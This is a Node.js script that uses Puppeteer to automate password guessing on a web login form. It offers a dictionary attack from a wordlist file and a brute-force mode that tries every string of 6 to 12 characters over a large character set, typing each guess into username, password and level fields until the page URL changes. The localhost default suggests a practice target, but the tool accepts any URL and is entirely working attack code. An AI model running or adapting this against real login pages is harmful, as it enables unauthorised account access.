const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const defaultTarget = "http://localhost:9999";
const defaultUsername = "bobby91";
const defaultLevel = "0";
const defaultMin = "6";
const defaultMax = "12";

class BruteForceAttack {
	constructor(level, username, min, max) {
		this.chars = [
			'0', '1', '2', '3', '4', '5', '6','7', '8', '9', 
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
			'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
			'É', 'é', 'Á', 'á', 'Ú', 'ú', 'Í', 'í', 'Ó', 'ó', 'È', 'è', 'À', 'à', 'Ù', 'ù', 'Ì', 'ì', 'Ò', 'ò', 'Ü', 'ü', 'Ö', 'ö', 'Ä', 'ä', 
			'°', '!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', '`', '´', '\\', '}', ']', '[', '{', '³', '²', '^', '+', '*', '~', '#', 
			'\'', '-', '_', ';', ',', '.', ':', 'µ', '@', '€', '|', '<', '>', '"'
		];

		this.charsLength = this.chars.length; 

		this.level = level;
		this.username = username;
		this.min = min;
		this.max = max;

		this.stop = true;
	}

	Start() {
		
		this.stop = false; 

		// init loop promises
		let p = Promise.resolve();

		// for each possible length
		for (let i = this.min; i <= this.max; i++) {
			if (this.stop) break;
			// call recursive loop and add in loop promises
			p = p.then(_ => this.recursiveLoop(i, ''));
		}
		return p;
	}

	recursiveLoop(length, str) {
		if (this.stop) return Promise.resolve();
    // if tmp len(string) = len(pdwd) try password with pupeeter 
		if(str.length == length) {
      return tryPWD(str, this.level, this.username);
    }
    
		// init loop promises
		let p = Promise.resolve();
		// for each char possible 
    for(let i = 0; i < this.charsLength; i++) {
      if (this.stop) break;

			// add to tmp string, call recursive loop and add to loop promises
      p = p.then(_ => this.recursiveLoop(length, str + this.chars[i]));
    }
  	return p;
	}

	Stop() {
		// block all current loops
		this.stop = true;
	}


}

class DictAttack {

	constructor(level, username, dictionary = "RichelieuDict.txt") {
		this.dictionary = dictionary;

		this.level = level;
		this.username = username;

		this.stop = true;
	}

	Start() {
		// init dict
		let dict = "";
		
		// Read dict file
		try {
			// load file sync
			dict = fs.readFileSync(this.dictionary, 'utf8')
		} catch (err) {
			console.error(err);
			return Promise.reject();
		}

		// Split string to array of words
		const words = dict.split(/\r?\n/);
		this.stop = false;

		// init promises loop
		let promise = Promise.resolve();
		// For each words, try password and return result in promise
		for (let word of words) {
			if (this.stop) break;
			promise = promise.then(_ => tryPWD(word, this.level, this.username))
		}
		return promise;
	}	


	// break promises loop
	Stop() {
		this.stop = true;
	}

}

// init page
let _page = null;

// get infos
function init(mode, url, level, username, min, max) {

	rl.close();

	console.log("Attack:", mode);
	console.log("Target:", url);
	console.log("Username:", username);
	console.log("Password Level:", level);
	if (min) console.log("Min. char:", min);
	if (max) console.log("Max. char:", max);


	let attack = null;
	let browser = null;

	// launch browser
	puppeteer.launch()
		.then(b => browser = b)

		.then(_ => browser.newPage())
		.then(page => _page = page)
		// load page
		.then(_ => _page.goto(url))
		.then(_ => {

			// select attack type
			switch (mode) {
				case 'dictionary':
					attack = new DictAttack(level, username);
					break;
				case 'bruteforce':
					attack = new BruteForceAttack(level, username, min, max);
					break;
				default:
					break;
			}
			return !attack ?
				Promise.reject('Unknown mode chosen') :
				// start attacking
				attack.Start()
					// all promises resolved, no password match
					.then(_ => "No password match!")
					// when promise rejected, password found
					.catch(e => "The password is: " + e)
					.finally(_ => {
						// stop attack
						attack.Stop();
						// close browser
						browser.close();
					})
		})
		.then(res => console.log(res))
		.finally(_ => {
			process.exit(0);
		});
}

// Test password on puppeteer page

function tryPWD(pwd, level, username) {
	// use previous url
	const baseUrl = _page.url();
	// return promise
	return _page.type('#username', username)
				.then(_ => _page.type('#password', pwd))
				.then(_ => _page.type('#level', level))
				.then(_ => _page.keyboard.press('Enter'))
				// wait
				.then(_ => _page.waitForNavigation()) 
				.then(_ => console.log("try pwd:", pwd))
				// if url changed return rejected promise with pwd
				.then(_ => (_page.url() != baseUrl) ? Promise.reject(pwd) : Promise.resolve())	
}



// terminal dialog
rl.question('Which target?\n\r', function (target) {
	if (!target) target = defaultTarget;
  rl.question('Which username?\n\r ', function (username) {
		if (!username) username = defaultUsername;
		rl.question('Which level?\n\r ', function (level) {
			if (!level) level = defaultLevel;
			rl.question('Which mode?\n\r1. Dictionary Attack\n\r2. Bruteforce Attack\n\r', function (mode) {
				if (mode !== "1" && mode !== "2") {
					console.log('Mode not recognized!');
					rl.close();
					process.exit(0);
				} 
				if (mode === "1") init("dictionary", target, level, username);
				if (mode === "2") {
					mode = "bruteforce";
					rl.question("How many min. characters in the password?\n\r", function(min) {
						if (!min) min = defaultMin;
						rl.question("How many max. characters in the password?\n\r", function(max) {
							if (!max) max = defaultMax;
							init("bruteforce", target, level, username, min, max);
						});
					});
				}
			});
		});
  });
});